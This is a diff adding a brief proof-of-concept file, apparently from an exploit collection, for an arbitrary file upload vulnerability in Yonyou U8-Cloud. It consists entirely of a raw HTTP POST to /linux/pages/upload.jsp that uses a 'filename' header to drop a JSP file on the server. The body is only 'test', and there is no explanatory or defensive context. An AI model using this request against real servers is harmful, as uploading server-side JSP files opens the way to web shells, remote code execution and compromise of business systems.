@@ -1,0 +1,12 @@
+# 用友U8-Cloud upload任意文件上传漏洞
+POST /linux/pages/upload.jsp HTTP/1.1
+Host: www.xwd_test.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Soapaction: "http://rainier/jobUpload"
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+filename: 29020.jsp
+Content-Length: 4
+
+test
